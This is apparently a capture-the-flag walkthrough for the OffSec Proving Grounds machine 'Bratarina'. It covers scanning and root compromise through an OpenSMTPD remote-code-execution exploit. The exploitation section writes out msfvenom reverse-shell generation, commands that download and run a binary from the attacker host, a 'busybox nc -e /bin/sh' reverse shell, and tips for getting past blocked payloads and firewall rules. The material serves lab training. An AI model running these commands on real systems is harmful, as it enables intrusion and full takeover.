# Bratarina — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Easy
**OS:** Linux

---

## TL;DR

OpenSMTPD RCE via EDB-47984 → tricky because standard reverse shell payloads are blocked → `busybox nc` works → instant root.

---

## Enumeration

```bash
sudo nmap -sC -p- -n -Pn -sV --min-rate=9362 192.168.244.71 -oN nmap.txt
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.6p1 Ubuntu |
| 25 | SMTP | OpenSMTPD |
| 80 | HTTP | nginx 1.14.0 (FlaskBB) |
| 445 | SMB | Samba 4.7.6 |

SMB has a backup folder with a passwd file inside. But the real star here is **OpenSMTPD** on port 25.

---

## Exploitation — OpenSMTPD RCE (EDB-47984)

Found an RCE exploit for OpenSMTPD: [EDB-47984](https://www.exploit-db.com/exploits/47984). Although it's listed for version 6.6.1, it works on older versions too.

Here's the catch — standard reverse shell payloads (`nc`, `python`, `bash -i`) are all **blocked**. OffSec intentionally restricted common payload tools. And only open ports work for callbacks (firewall).

**The msfvenom approach:**

```bash
msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.49.135 LPORT=445
python3 47984.py 192.168.135.71 25 'wget 192.168.49.135/shell -O /tmp/shell'
python3 47984.py 192.168.135.71 25 'chmod +x /tmp/shell'
python3 47984.py 192.168.135.71 25 '/tmp/shell'
```

**The easier way — busybox nc:**

```bash
python3 47984.py 192.168.244.71 25 "busybox nc 192.168.45.201 80 -e /bin/sh"
```

OffSec blocked the usual suspects but missed `busybox nc`. Also note we're using port 80 (an open port) for the callback.

OpenSMTPD runs as root, so we get a **root shell** immediately. 🎉

---

## Key Takeaways

- **OpenSMTPD RCE** affects multiple versions, not just the one listed in the exploit title
- When common reverse shell payloads are blocked, try alternatives: `busybox nc`, `socat`, `perl`, `ruby`, compiled binaries
- **Firewall rules** commonly restrict outbound connections — always try callback on ports the target already has open
- If nothing works, the msfvenom approach (download binary, chmod, execute) is the nuclear option

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
